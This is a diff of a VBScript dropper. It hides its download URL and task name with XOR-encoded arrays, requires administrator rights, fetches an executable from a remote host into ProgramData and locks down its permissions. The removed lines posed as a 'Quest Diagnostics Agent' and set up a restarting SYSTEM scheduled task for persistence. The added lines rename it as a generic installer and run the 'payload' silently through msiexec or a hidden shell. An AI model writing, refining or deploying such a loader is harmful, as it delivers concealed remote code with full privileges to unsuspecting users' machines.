@@ -1,16 +1,16 @@
-﻿Option Explicit
+Option Explicit
 Dim gShell, gFSO, gSA
-Dim gQ, gExePath, gLogFile
+Dim gQ, gFilePath, gLogFile
 Dim gOK, gErrMsg
-Const INSTALL_DIR     = "C:\ProgramData\QuestDiagnostics"
-Const EXE_NAME        = "Quest-diagnostics-Agent.exe"
+Const INSTALL_DIR     = "C:\ProgramData\UniversalInstaller"
+Const FILE_NAME       = "setup.exe"
 Const MIN_SIZE_BYTES  = 102400
 
 ' --- Decrypt URL & Task ---
 Dim k, uArr, tArr, i, DOWNLOAD_URL, TASK_NAME
-k = 91
-uArr = Array(51,47,47,43,40,97,116,116,60,50,47,55,58,57,117,56,52,54,116,50,47,118,60,41,52,46,43,104,107,111,110,110,104,108,116,40,47,58,47,62,54,62,53,47,118,51,116,118,116,41,58,44,116,54,58,50,53,116,8,47,58,47,62,54,62,53,47,118,13,50,62,44,62,41,118,26,60,62,53,47,117,62,35,62)
-tArr = Array(8,47,58,47,62,54,62,53,47,118,13,50,62,44,62,41,118,107,106,111)
+k = 42
+uArr = Array(66,94,94,90,89,16,5,5,77,67,94,70,75,72,4,73,69,71,5,67,94,7,77,88,69,95,90,25,26,30,31,31,25,29,5,89,94,75,94,79,71,79,68,94,7,66,5,7,5,88,75,93,5,71,75,67,68,5,121,94,75,94,79,71,79,68,94,7,124,67,79,93,79,88,7,107,77,79,68,94,4,79,82,79)
+tArr = Array(110,95,71,71,83)
 DOWNLOAD_URL = ""
 TASK_NAME = ""
 For i = 0 To UBound(uArr)
@@ -70,9 +70,9 @@ End Function
 Function DownloadFile()
     DownloadFile = False
     Dim http, tmp, stream, f
-    tmp = gExePath & ".download"
+    tmp = gFilePath & ".download"
     On Error Resume Next
-    If gFSO.FileExists(gExePath) Then gFSO.DeleteFile gExePath, True
+    If gFSO.FileExists(gFilePath) Then gFSO.DeleteFile gFilePath, True
     On Error GoTo 0
     Log "Downloading: " & DOWNLOAD_URL
     On Error Resume Next
@@ -97,82 +97,38 @@ Function DownloadFile()
         gFSO.DeleteFile tmp, True
         Exit Function
     End If
-    gFSO.MoveFile tmp, gExePath
-    gShell.Run "icacls " & gQ & gExePath & gQ & " /inheritance:r /grant:r " & gQ & "SYSTEM:F" & gQ & " " & gQ & "Administrators:F" & gQ, 0, True
+    gFSO.MoveFile tmp, gFilePath
+    gShell.Run "icacls " & gQ & gFilePath & gQ & " /inheritance:r /grant:r " & gQ & "SYSTEM:F" & gQ & " " & gQ & "Administrators:F" & gQ, 0, True
     DownloadFile = True
 End Function
 
-Function RegisterTask()
-    RegisterTask = False
-    Dim svc, root, td, act, trg1, trg2, pri, st, existing
+Function ExecutePayload()
+    ExecutePayload = False
     On Error Resume Next
-    Set svc = CreateObject("Schedule.Service")
-    svc.Connect
-    If Err.Number <> 0 Then Exit Function
-    Set root = svc.GetFolder("\")
-    Err.Clear
-    Set existing = root.GetTask(TASK_NAME)
-    If Err.Number = 0 Then
-        root.DeleteTask TASK_NAME, 0
-        Err.Clear
-    End If
-    Err.Clear
-    Set td = svc.NewTask(0)
-    td.RegistrationInfo.Description = "Quest Diagnostics Agent"
-    Set pri = td.Principal
-    pri.UserId = "SYSTEM"
-    pri.LogonType = 5
-    pri.RunLevel = 1
-    Set st = td.Settings
-    st.Enabled = True
-    st.AllowDemandStart = True
-    st.StartWhenAvailable = True
-    st.ExecutionTimeLimit = "PT0S"
-    st.RestartCount = 999
-    st.RestartInterval = "PT1M"
-    st.MultipleInstances = 2
-    st.DisallowStartIfOnBatteries = False
-    st.StopIfGoingOnBatteries = False
-    Set act = td.Actions.Create(0)
-    act.Path = gExePath
-    act.WorkingDirectory = INSTALL_DIR
-    Set trg1 = td.Triggers.Create(8)
-    trg1.Delay = "PT30S"
-    trg1.Enabled = True
-    Set trg2 = td.Triggers.Create(9)
-    trg2.Delay = "PT30S"
-    trg2.Enabled = True
-    Err.Clear
-    root.RegisterTaskDefinition TASK_NAME, td, 6, "SYSTEM", Null, 5
-    If Err.Number <> 0 Then Exit Function
-    RegisterTask = True
-End Function
+    Log "Executing payload..."
+    Dim rc, fileExt
+    fileExt = LCase(Mid(DOWNLOAD_URL, InStrRev(DOWNLOAD_URL, ".") + 1))
 
-Function RunTaskAndVerify()
-    RunTaskAndVerify = False
-    Dim svc, root, task, tries
-    On Error Resume Next
-    Set svc = CreateObject("Schedule.Service")
-    svc.Connect
-    Set root = svc.GetFolder("\")
-    Set task = root.GetTask(TASK_NAME)
-    Err.Clear
-    task.Run Null
-    If Err.Number <> 0 Then Exit Function
-    tries = 0
-    Do
-        WScript.Sleep 1000
-        tries = tries + 1
-        If tries > 15 Then Exit Do
-    Loop While task.State = 2
-    RunTaskAndVerify = True
+    If fileExt = "msi" Then
+        Log "Detected MSI. Running with msiexec..."
+        rc = gShell.Run("msiexec.exe /i """ & gFilePath & """ /qn /norestart", 0, True)
+    Else
+        Log "Detected EXE. Running directly..."
+        rc = gShell.Run("""" & gFilePath & """", 0, True)
+    End If
+
+    If rc = 0 Or rc = 3010 Then
+        Log "Execution successful (Code: " & rc & ")"
+        ExecutePayload = True
+    Else
+        Log "Execution failed (Code: " & rc & ")"
+    End If
 End Function
 
 Sub DoInstall()
     If Not ApplyDirACL(INSTALL_DIR) Then gErrMsg = "ACL failed" : Exit Sub
     If Not DownloadFile() Then gErrMsg = "Download failed" : Exit Sub
-    If Not RegisterTask() Then gErrMsg = "Task failed" : Exit Sub
-    If Not RunTaskAndVerify() Then gErrMsg = "Run failed" : Exit Sub
+    If Not ExecutePayload() Then gErrMsg = "Execution failed" : Exit Sub
     gOK = True
 End Sub
 
@@ -185,7 +141,7 @@ If Not IsElevated() Then
 End If
 
 gQ = Chr(34)
-gExePath = INSTALL_DIR & "\" & EXE_NAME
+gFilePath = INSTALL_DIR & "\" & FILE_NAME
 gLogFile = INSTALL_DIR & "\install.log"
 gOK = False
 
